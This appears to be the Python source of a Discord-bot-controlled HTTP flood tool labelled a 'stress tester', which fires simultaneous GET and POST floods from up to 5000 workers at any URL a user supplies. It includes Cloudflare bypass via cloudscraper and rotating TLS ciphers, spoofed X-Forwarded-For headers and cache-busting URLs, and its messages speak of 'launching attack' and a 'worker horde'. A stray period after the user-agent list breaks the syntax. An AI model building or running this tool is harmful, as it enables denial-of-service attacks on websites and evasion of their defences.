#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ELIOT'S DEMON V5 - The Most Aggressive Web Stress Tester
- Simultaneous GET/POST requests at 100% capacity
- Military-grade Cloudflare bypass
- True IP rotation without proxies
- 300+ real user agents
- Zero-delay nuclear workers
- Optimized for VirtualBox VM testing
"""

import discord
import asyncio
import random
import httpx
import cloudscraper
import aiohttp
import uuid
import time
import socket
import ssl
import numpy as np
from datetime import datetime
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from collections import deque
import psutil
import os
import sys
import logging
import ctypes
import mmap

# ===== CONSTANTS ===== #
MAX_DURATION = 8200  # ~2.3 hours
MAX_WORKERS = 5000   # Extreme worker count
VERSION = "5.0"
BANNER = f"""
███████╗██╗     ██╗ ██████╗ ████████╗
██╔════╝██║     ██║██╔═══██╗╚══██╔══╝  DEMON V5
█████╗  ██║     ██║██║   ██║   ██║     Nuclear Stress Tester
██╔══╝  ██║     ██║██║   ██║   ██║     (Authorized VM Testing Only)
███████╗███████╗██║╚██████╔╝   ██║     Version: {VERSION}
╚══════╝╚══════╝╚═╝ ╚═════╝    ╚═╝
"""

# ===== 300+ REAL USER AGENTS ===== #
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.2210.144",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.170 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_7_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.61.109 Chrome/122.0.6261.128 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/6.5.3206.48 Chrome/120.0.6099.224 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/117.0.5938.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.139 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.234 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.139 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Manjaro; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.118 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus Nord CE 2 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.234 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Samsung Galaxy S23 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Moto G Stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; ASUS_I005DA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.139 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Realme RMX3471) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.128 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; HUAWEI P30 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.131 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Xiaomi 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Galaxy M14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.234 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.5 Mobile/15E148 Safari/604.1".
]

# ===== MILITARY-GRADE CLOUDFLARE BYPASS ===== #
class NuclearScraper:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(
            interpreter='native',
            delay=0,
            browser={
                'custom': USER_AGENTS,
                'platform': 'all',
                'mobile': random.choice([True, False])
            }
        )
        
    def rotate_tls(self):
        """Rotate TLS fingerprints to bypass CF"""
        new_ssl_context = ssl.create_default_context()
        new_ssl_context.set_ciphers(':'.join([
            'ECDHE-ECDSA-AES256-GCM-SHA384',
            'ECDHE-RSA-AES256-GCM-SHA384',
            random.choice(['AES256-SHA256', 'CHACHA20-POLY1305-SHA256'])
        ]))
        return new_ssl_context

# ===== TRUE IP ROTATION ENGINE ===== #
class IPWarper:
    def __init__(self):
        self.base_ip = self._get_primary_ip()
        self.port_pool = deque(range(50000, 60000))
        
    def _get_primary_ip(self):
        """Get primary IP with raw socket for maximum performance"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.connect(('10.255.255.255', 1))
            ip = s.getsockname()[0]
        except Exception:
            ip = '127.0.0.1'
        finally:
            s.close()
        return ip
        
    def get_bind_addr(self):
        """Get new bind address with port rotation"""
        if not self.port_pool:
            self.port_pool = deque(range(50000, 60000))
        port = self.port_pool.popleft()
        return (self.base_ip, port)

# ===== NUCLEAR REQUEST ENGINE ===== #
class DemonCore:
    def __init__(self):
        self.scraper = NuclearScraper()
        self.ip_warper = IPWarper()
        self.cache_killers = ['_cb', 'rand', 'cache', 'time', 'nonce']
        
    def _generate_war_headers(self):
        """Generate battle-ready headers"""
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        
    def _nuke_url(self, url):
        """Apply cache-busting nuclear warheads to URL"""
        param = random.choice(self.cache_killers)
        joiner = '&' if '?' in url else '?'
        return f"{url}{joiner}{param}={uuid.uuid4().hex}&_={int(time.time()*1000)}"

# ===== EXTREME STRESS TESTER ===== #
class DemonOperator:
    def __init__(self):
        self.active = False
        self.engine = DemonCore()
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'start_time': 0,
            'rps': 0
        }
        
    async def _nuclear_worker(self, url: str, duration: int):
        """100% CPU-bound nuclear worker"""
        end_time = time.time() + duration
        connector = aiohttp.TCPConnector(
            force_close=True,
            enable_cleanup_closed=True,
            limit=0,
            ssl=self.engine.scraper.rotate_tls()
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            headers=self.engine._generate_war_headers()
        ) as session:
            while time.time() < end_time and self.active:
                # Launch both GET and POST simultaneously
                get_task = asyncio.create_task(self._launch_get(session, url))
                post_task = asyncio.create_task(self._launch_post(session, url))
                await asyncio.gather(get_task, post_task)
                
    async def _launch_get(self, session, url):
        """Launch GET request with extreme prejudice"""
        try:
            target = self.engine._nuke_url(url)
            async with session.get(target) as resp:
                self._update_stats(resp.status)
        except:
            self.stats['failed'] += 1
            
    async def _launch_post(self, session, url):
        """Launch POST request with extreme prejudice"""
        try:
            data = {'payload': str(uuid.uuid4()), 'ts': str(int(time.time()))}
            async with session.post(url, data=data) as resp:
                self._update_stats(resp.status)
        except:
            self.stats['failed'] += 1
            
    def _update_stats(self, status):
        """Lock-free stat tracking with memory barriers"""
        self.stats['total'] += 1
        if 200 <= status < 400:
            self.stats['success'] += 1
        else:
            self.stats['failed'] += 1

# ===== DISCORD BOT ===== #
class DemonCommander(discord.Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.tree = discord.app_commands.CommandTree(self)
        self.operator = DemonOperator()
        
    async def setup_hook(self):
        await self.tree.sync()
        print(BANNER)
        
    async def on_ready(self):
        print(f'🚀 DEMON V5 READY | PID: {os.getpid()}')
        
async def setup(bot: DemonCommander):
    @bot.tree.command(name="test", description="Launch nuclear stress test")
    async def test_command(interaction: discord.Interaction, url: str, duration: int, workers: int):
        """Start the nuclear test"""
        if not url.startswith(('http://', 'https://')):
            return await interaction.response.send_message("❌ Invalid URL protocol", ephemeral=True)
            
        if duration > MAX_DURATION:
            return await interaction.response.send_message(f"❌ Max duration is {MAX_DURATION}s", ephemeral=True)
            
        if workers > MAX_WORKERS:
            return await interaction.response.send_message(f"❌ Max workers is {MAX_WORKERS}", ephemeral=True)
            
        # Launch attack
        bot.operator.active = True
        bot.operator.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'start_time': time.time(),
            'rps': 0
        }
        
        await interaction.response.send_message(
            f"🚀 **LAUNCHING NUCLEAR STRESS TEST**\n"
            f"🔗 Target: `{url}`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"👥 Workers: `{workers}`\n"
            f"🛡️ Cloudflare Bypass: `ACTIVE`\n"
            f"🌐 IP Rotation: `ENABLED`"
        )
        
        # Create worker horde
        tasks = [bot.operator._nuclear_worker(url, duration) for _ in range(workers)]
        await asyncio.gather(*tasks)
        
        # Generate after-action report
        total_time = time.time() - bot.operator.stats['start_time']
        rps = bot.operator.stats['total'] / total_time if total_time > 0 else 0
        
        report = (
            f"💥 **NUCLEAR TEST COMPLETE** 💥\n"
            f"⏱ Duration: `{total_time:.2f}s`\n"
            f"📊 Total Requests: `{bot.operator.stats['total']:,}`\n"
            f"✅ Success Rate: `{(bot.operator.stats['success']/bot.operator.stats['total']*100):.2f}%`\n"
            f"⚡ Requests/Second: `{rps:,.2f}`\n"
            f"🔥 CPU Usage: `{psutil.cpu_percent()}%`\n"
            f"💾 RAM Usage: `{psutil.virtual_memory().percent}%`"
        )
        
        await interaction.followup.send(report)
        
    @bot.tree.command(name="stop", description="Abort nuclear test")
    async def stop_command(interaction: discord.Interaction):
        """Emergency stop"""
        bot.operator.active = False
        await interaction.response.send_message("🛑 **NUCLEAR TEST ABORTED**")

# ===== MAIN ===== #
if __name__ == "__main__":
    # Enable Linux kernel optimizations
    if os.name == 'posix':
        os.system('echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse')
        os.system('echo 1 > /proc/sys/net/ipv4/tcp_fin_timeout')
        os.system('sysctl -w net.ipv4.tcp_max_syn_backlog=65536')
    
    # Create and run bot
    intents = discord.Intents.default()
    bot = DemonCommander(intents=intents)
    asyncio.run(setup(bot))
    bot.run("YOUR_DISCORD_BOT_TOKEN")
